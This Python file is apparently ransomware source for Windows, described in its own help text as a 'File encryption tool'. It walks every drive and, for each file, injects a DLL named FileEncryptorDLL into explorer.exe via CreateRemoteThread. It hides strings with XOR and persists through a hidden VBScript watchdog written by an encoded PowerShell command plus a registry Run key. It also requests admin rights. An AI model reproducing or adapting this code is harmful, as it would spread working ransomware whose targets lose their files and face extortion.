import base64
import os
import subprocess
import sys
import time
import random
import ctypes
import string
import multiprocessing
from pathlib import Path
from ctypes import wintypes
from queue import Empty
import winreg
import psutil
import hashlib
import argparse

# Constants
MAX_WORKERS = 4  # Conservative number to prevent system overload
WORKER_TIMEOUT = 30  # Seconds before worker timeout
INJECTION_DELAY = 1.0  # Minimum delay between injections
MAX_FILE_QUEUE_SIZE = 100  # Maximum files in processing queue
PROCESS_TIMEOUT = 300  # 5 minute timeout for processes

# XOR encryption for strings
def xor_encrypt(data, key):
    data_bytes = data.encode('utf-8')
    return bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data_bytes)])

def xor_decrypt(data, key):
    decrypted = bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)])
    return decrypted.decode('utf-8')

KEY = "x0rK3y"

# Obfuscated Strings
OBF_KERNEL32 = xor_encrypt("kernel32.dll", KEY)
OBF_LOADLIBRARYW = xor_encrypt("LoadLibraryW", KEY)
OBF_ENCRYPTION_TARGET = xor_encrypt("ENCRYPTION_TARGET", KEY)
DEFAULT_DLL_PATH = xor_encrypt(r"C:\Users\attacker\Desktop\FileEncryptorDLL.dll", KEY)

# Excluded directories and extensions
extensions_excluded = (".exe", ".dll", ".sys", ".bat", ".com", ".vbs", ".locked")
folders_excluded = [
    "windows", "program files", "program files (x86)", "system volume information",
    "$recycle.bin", ".git", "boot", "temp", "tmp", "cache", "appdata", "local",
    "microsoft", "programdata", ".vscode", "ransomware"
]

# Watchdog VBScript Template
vbs_template = r'''On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
target = "{script_path}"
watchdogName = "watchdog.vbs"
Set colMe = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe' OR Name='cscript.exe'")
count = 0
For Each proc In colMe
    If InStr(LCase(proc.CommandLine), LCase(watchdogName)) > 0 Then
        count = count + 1
    End If
Next
If count > 1 Then
    WScript.Quit
End If
Randomize
WScript.Sleep (Int((80 * Rnd) + 10) * 1000)
Do
    found = False
    Set colProcessList = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='python.exe' OR Name='pythonw.exe'")
    For Each objProcess In colProcessList
        If InStr(LCase(objProcess.CommandLine), LCase(" " & target & " ")) > 0 Or _
           Right(LCase(objProcess.CommandLine), Len(target)) = LCase(target) Then
            found = True
            Exit For
        End If
    Next
    If Not found Then
        WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Start-Process -WindowStyle Hidden -FilePath 'pythonw.exe' -ArgumentList '" & target & "'""", 0, False
    End If
    WScript.Sleep 5000
Loop
'''

class DllInjector:
    def __init__(self, dll_path):
        self.dll_path = os.path.abspath(xor_decrypt(dll_path, KEY))
        self._setup_functions()
        self.last_injection_time = 0

    def _setup_functions(self):
        self.kernel32 = ctypes.WinDLL(xor_decrypt(OBF_KERNEL32, KEY), use_last_error=True)
        
        # Define proper function prototypes
        self.OpenProcess = self.kernel32.OpenProcess
        self.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
        self.OpenProcess.restype = wintypes.HANDLE
        
        self.VirtualAllocEx = self.kernel32.VirtualAllocEx
        self.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
        self.VirtualAllocEx.restype = wintypes.LPVOID
        
        self.WriteProcessMemory = self.kernel32.WriteProcessMemory
        self.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
        self.WriteProcessMemory.restype = wintypes.BOOL
        
        self.GetModuleHandle = self.kernel32.GetModuleHandleW
        self.GetModuleHandle.argtypes = [wintypes.LPCWSTR]
        self.GetModuleHandle.restype = wintypes.HMODULE
        
        self.GetProcAddress = self.kernel32.GetProcAddress
        self.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]
        self.GetProcAddress.restype = wintypes.LPVOID
        
        self.CreateRemoteThread = self.kernel32.CreateRemoteThread
        self.CreateRemoteThread.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.SECURITY_ATTRIBUTES), ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
        self.CreateRemoteThread.restype = wintypes.HANDLE
        
        self.CloseHandle = self.kernel32.CloseHandle
        self.CloseHandle.argtypes = [wintypes.HANDLE]
        self.CloseHandle.restype = wintypes.BOOL

    def inject(self, pid, target_file=None):
        current_time = time.time()
        if current_time - self.last_injection_time < INJECTION_DELAY:
            time.sleep(INJECTION_DELAY - (current_time - self.last_injection_time))
        
        PROCESS_ALL_ACCESS = 0x001F0FFF
        process = self.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not process:
            return False

        try:
            mem_size = (len(self.dll_path) + 1) * 2
            dll_path_remote = self.VirtualAllocEx(process, None, mem_size, 0x3000, 0x40)
            if not dll_path_remote:
                return False

            written = ctypes.c_size_t(0)
            dll_path_encoded = self.dll_path.encode('utf-16le') + b'\x00\x00'
            
            if not self.WriteProcessMemory(process, dll_path_remote, dll_path_encoded, len(dll_path_encoded), ctypes.byref(written)):
                return False

            kernel32_handle = self.GetModuleHandle(ctypes.create_unicode_buffer(xor_decrypt(OBF_KERNEL32, KEY)))
            if not kernel32_handle:
                return False

            load_library = self.GetProcAddress(kernel32_handle, xor_decrypt(OBF_LOADLIBRARYW, KEY).encode())
            if not load_library:
                return False

            thread = self.CreateRemoteThread(process, None, 0, load_library, dll_path_remote, 0, None)
            if thread:
                self.kernel32.WaitForSingleObject(thread, 5000)
                self.CloseHandle(thread)
                self.last_injection_time = time.time()
                return True
            return False
        except Exception as e:
            print(f"Injection error: {e}")
            return False
        finally:
            self.CloseHandle(process)

def find_explorer_pid():
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == 'explorer.exe':
                return proc.info['pid']
    except Exception:
        pass
    return None

def create_watchdog_vbs(script_path):
    try:
        b64_vbs = base64.b64encode(vbs_template.format(script_path=script_path).encode()).decode()
        hidden_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Themes")
        os.makedirs(hidden_dir, exist_ok=True)
        vbs_path = os.path.join(hidden_dir, "watchdog.vbs")
        powershell_command = (
            f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command '
            f'"$b64 = \'{b64_vbs}\'; '
            f'$vbs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64)); '
            f'[System.IO.File]::WriteAllText(\'{vbs_path.replace("\\", "\\\\")}\', $vbs); '
            f'Start-Process -WindowStyle Hidden wscript.exe \'{vbs_path}\'"'
        )
        subprocess.Popen(powershell_command, shell=True)
    except Exception as e:
        print(f"Watchdog creation error: {e}")

def add_registry_persistence(script_path):
    try:
        hidden_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Themes")
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        value_name = "WatchdogAuto"
        vbs_path = os.path.join(hidden_dir, "watchdog.vbs")
        
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, vbs_path)
    except Exception as e:
        print(f"Registry error: {e}")

def is_in_excluded_folder(file_path: Path):
    try:
        path_parts = [part.lower() for part in file_path.resolve().parts]
        for exclu in folders_excluded:
            for part in path_parts:
                if exclu in part:
                    return True
        return False
    except Exception:
        return True

def get_drives():
    drives = []
    for letter in string.ascii_uppercase:
        drive = f"{letter}:\\"
        if os.path.exists(drive):
            drives.append(drive)
    return drives

def worker(queue, dll_path):
    injector = DllInjector(dll_path)
    while True:
        try:
            file = queue.get(timeout=WORKER_TIMEOUT)
            if file is None:
                break
                
            if is_in_excluded_folder(file):
                continue
                
            if file.is_file() and file.suffix.lower() not in extensions_excluded:
                pid = find_explorer_pid()
                if not pid:
                    continue
                    
                os.environ[xor_decrypt(OBF_ENCRYPTION_TARGET, KEY)] = str(file)
                if not injector.inject(pid, str(file)):
                    print(f"Failed to inject for file: {file}")
                    
        except Empty:
            break
        except Exception as e:
            print(f"[!] Worker error: {e}")

def process_folder(folder_path, dll_path, workers_count):
    if not os.path.exists(folder_path):
        print(f"Error: Folder {folder_path} does not exist")
        return

    folder_path = Path(folder_path).resolve()
    queue = multiprocessing.Queue(maxsize=MAX_FILE_QUEUE_SIZE)
    processes = []
    
    # Start workers
    for _ in range(min(workers_count, MAX_WORKERS)):
        p = multiprocessing.Process(target=worker, args=(queue, dll_path))
        p.start()
        processes.append(p)
    
    # Feed files to queue
    try:
        for file in folder_path.rglob("*"):
            try:
                queue.put(file, timeout=1)
            except:
                continue
    except Exception as e:
        print(f"Folder processing error: {e}")
    
    # Signal workers to exit
    for _ in processes:
        try:
            queue.put(None, timeout=1)
        except:
            continue
    
    # Wait for workers
    for p in processes:
        p.join(timeout=5)
        if p.is_alive():
            p.terminate()

def process_drive(drive, dll_path, workers_per_drive):
    queue = multiprocessing.Queue(maxsize=MAX_FILE_QUEUE_SIZE)
    processes = []
    
    for _ in range(min(workers_per_drive, MAX_WORKERS)):
        p = multiprocessing.Process(target=worker, args=(queue, dll_path))
        p.start()
        processes.append(p)
    
    try:
        for file in Path(drive).rglob("*"):
            try:
                queue.put(file, timeout=1)
            except:
                continue
    except Exception as e:
        print(f"Drive processing error: {e}")
    
    for _ in processes:
        try:
            queue.put(None, timeout=1)
        except:
            continue
    
    for p in processes:
        p.join(timeout=5)
        if p.is_alive():
            p.terminate()

def main():
    parser = argparse.ArgumentParser(description='File encryption tool')
    parser.add_argument('--folder', type=str, help='Specific folder to encrypt files in')
    args = parser.parse_args()

    script_path = os.path.abspath(sys.argv[0])
    create_watchdog_vbs(script_path)
    add_registry_persistence(script_path)

    if args.folder:
        # Process specific folder
        print(f"[+] Processing folder: {args.folder}")
        process_folder(args.folder, DEFAULT_DLL_PATH, MAX_WORKERS)
    else:
        # Process all drives
        drives = get_drives()
        if not drives:
            print("[!] No drives found")
            return

        total_workers = min(MAX_WORKERS, len(drives) * 2)
        workers_per_drive = max(1, total_workers // len(drives))
        
        processes = []
        for drive in drives:
            p = multiprocessing.Process(
                target=process_drive, 
                args=(drive, DEFAULT_DLL_PATH, workers_per_drive),
                daemon=True
            )
            p.start()
            processes.append(p)
            time.sleep(0.5)  # Stagger process starts
        
        for p in processes:
            p.join(timeout=PROCESS_TIMEOUT)
            if p.is_alive():
                p.terminate()

if __name__ == "__main__":
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, os.path.abspath(sys.argv[0]), None, 1)
        sys.exit()
    main()

